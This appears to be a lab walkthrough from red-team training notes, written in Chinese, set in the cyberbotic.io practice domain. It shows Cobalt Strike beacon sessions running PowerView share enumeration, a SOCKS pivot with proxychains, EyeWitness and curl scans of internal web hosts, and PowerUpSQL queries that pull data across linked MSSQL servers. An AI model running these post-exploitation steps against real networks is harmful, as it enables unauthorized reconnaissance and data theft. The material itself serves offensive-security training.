# File Shares

枚举域里面的所有分享目录
```
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
[*] Tasked beacon to import: C:\Tools\PowerSploit\Recon\PowerView.ps1
[+] host called home, sent: 145561 bytes
beacon> run hostname
[*] Tasked beacon to run: hostname
[+] host called home, sent: 26 bytes
[+] received output:
wkstn-1

beacon> powershell Find-DomainShare -ComputerDomain cyberbotic.io -CheckShareAccess
[*] Tasked beacon to run: Find-DomainShare -ComputerDomain cyberbotic.io -CheckShareAccess
[+] host called home, sent: 441 bytes
[+] received output:
#< CLIXML

Name       Type Remark                                      ComputerName        
----       ---- ------                                      ------------        
CertEnroll    0 Active Directory Certificate Services share dc-1.cyberbotic.io  
address       0                                             exch-1.cyberbotic.io
data$         0                                             dc-1.cyberbotic.io  
NETLOGON      0 Logon server share                          dc-1.cyberbotic.io  
software      0                                             dc-1.cyberbotic.io  
SYSVOL        0 Logon server share                          dc-1.cyberbotic.io  

beacon> powershell Find-DomainShare -ComputerDomain dev.cyberbotic.io -CheckShareAccess
[*] Tasked beacon to run: Find-DomainShare -ComputerDomain dev.cyberbotic.io -CheckShareAccess
[+] host called home, sent: 453 bytes
[+] received output:

[+] received output:
Name           Type Remark              ComputerName             
----           ---- ------              ------------             
home$             0                     dc-2.dev.cyberbotic.io   
NETLOGON          0 Logon server share  dc-2.dev.cyberbotic.io   
software          0                     dc-2.dev.cyberbotic.io   
SYSVOL            0 Logon server share  dc-2.dev.cyberbotic.io   
ADMIN$   2147483648 Remote Admin        wkstn-1.dev.cyberbotic.io
C$       2147483648 Default share       wkstn-1.dev.cyberbotic.io
ADMIN$   2147483648 Remote Admin        srv-1.dev.cyberbotic.io  
C$       2147483648 Default share       srv-1.dev.cyberbotic.io  

```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661819204162.png)


# Internal Web Apps

先在wkstn-1做一个pivot
```
socks 1080
```

准备一份主机名单
```
root@kali:/opt/EyeWitness/Python# cat /root/targets.txt
10.10.17.71
10.10.17.25
10.10.17.68
```

执行枚举上面主机里的web服务
```
root@kali:/opt/EyeWitness/Python# proxychains4 ./EyeWitness.py --web -f /root/targets.txt -d /root/dev --no-dns --no-prompt

################################################################################
#                                  EyeWitness                                  #
################################################################################
#           FortyNorth Security - https://www.fortynorthsecurity.com           #
################################################################################

Starting Web Requests (3 Hosts)
Message: Socket timeout reading Marionette handshake data: Resource temporarily unavailable (os error 11)

Attempting to screenshot http://10.10.17.71
[*] WebDriverError when connecting to http://10.10.17.71
Attempting to screenshot http://10.10.17.25
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.17.25:80  ...  OK
Attempting to screenshot http://10.10.17.68
[*] Hit timeout limit when connecting to http://10.10.17.68, retrying
Message: Socket timeout reading Marionette handshake data: Resource temporarily unavailable (os error 11)

Message: Socket timeout reading Marionette handshake data: Resource temporarily unavailable (os error 11)

Finished in 206.4997580051422 seconds

```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661820202849.png)

10.10.17.25:80有东西

尝试访问
```
root@kali:/opt/EyeWitness/Python# proxychains curl -v http://10.10.17.25
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
*   Trying 10.10.17.25:80...
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.17.25:80  ...  OK
* Connected to 10.10.17.25 (127.0.0.1) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.17.25
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 401 Unauthorized
< Content-Type: text/html
< Server: Microsoft-IIS/10.0
< WWW-Authenticate: Negotiate
< WWW-Authenticate: NTLM
< Date: Tue, 30 Aug 2022 00:45:16 GMT
< Content-Length: 1293
< 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
<title>401 - Unauthorized: Access is denied due to invalid credentials.</title>
<style type="text/css">
<!--
body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
fieldset{padding:0 15px 10px 15px;} 
h1{font-size:2.4em;margin:0;color:#FFF;}
h2{font-size:1.7em;margin:0;color:#CC0000;} 
h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} 
#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
background-color:#555555;}
#content{margin:0 0 0 2%;position:relative;}
.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
-->
</style>
</head>
<body>
<div id="header"><h1>Server Error</h1></div>
<div id="content">
 <div class="content-container"><fieldset>
  <h2>401 - Unauthorized: Access is denied due to invalid credentials.</h2>
  <h3>You do not have permission to view this directory or page using the credentials that you supplied.</h3>
 </fieldset></div>
</div>
</body>
</html>
* Connection #0 to host 10.10.17.25 left intact

```

报 Access is denied


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661820380418.png)

# Databases

查找关键词```poject```的mssql实例

```
beacon> powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
[*] Tasked beacon to import: C:\Tools\PowerUpSQL\PowerUpSQL.ps1
[+] host called home, sent: 203035 bytes
beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "project" -SampleSize 5 | select instance, database, column, sample | ft -autosize
[*] Tasked beacon to run: Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "project" -SampleSize 5 | select instance, database, column, sample | ft -autosize
[+] host called home, sent: 943 bytes
[+] received output:
#< CLIXML

Instance                     Database Column      Sample         
--------                     -------- ------      ------         
srv-1.dev.cyberbotic.io,1433 master   ProjectName Mild Sun       
srv-1.dev.cyberbotic.io,1433 master   ProjectName Warm Venus     
srv-1.dev.cyberbotic.io,1433 master   ProjectName Grim Lyric     
srv-1.dev.cyberbotic.io,1433 master   ProjectName Precious Castle
srv-1.dev.cyberbotic.io,1433 master   ProjectName Fine Devil
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661819813711.png)

根据实例执行sql

枚举表名
```
beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select * from information_schema.tables')"
[*] Tasked beacon to run: Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select * from information_schema.tables')"
[+] host called home, sent: 681 bytes
[+] received output:
#< CLIXML

TABLE_CATALOG TABLE_SCHEMA TABLE_NAME            TABLE_TYPE
------------- ------------ ----------            ----------
master        dbo          spt_fallback_db       BASE TABLE
master        dbo          spt_fallback_dev      BASE TABLE
master        dbo          spt_fallback_usg      BASE TABLE
master        dbo          spt_values            VIEW      
master        dbo          spt_monitor           BASE TABLE
master        dbo          MSreplication_options BASE TABLE
master        dbo          VIPClients            BASE TABLE

```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661820029982.png)

枚举列

```
beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select column_name from master.information_schema.columns')"
[*] Tasked beacon to run: Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select column_name from master.information_schema.columns')"
[+] host called home, sent: 729 bytes
[+] received output:
#< CLIXML

column_name       
-----------       
City              
Name              
OrgNumber         
Street            
VIPClientsID      
install_failures  
major_version     
minor_version     
optname           
revision          
value             
connections       
cpu_busy          
...
...    

```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661820115716.png)

枚举OrgNumber 

```
beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select top 5 OrgNumber from master.dbo.VIPClients')"
[*] Tasked beacon to run: Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select top 5 OrgNumber from master.dbo.VIPClients')"
[+] host called home, sent: 709 bytes
[+] received output:
#< CLIXML

OrgNumber  
---------  
65618655299
69838663099
12289506999
73723428599
51766460299

```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661820152793.png)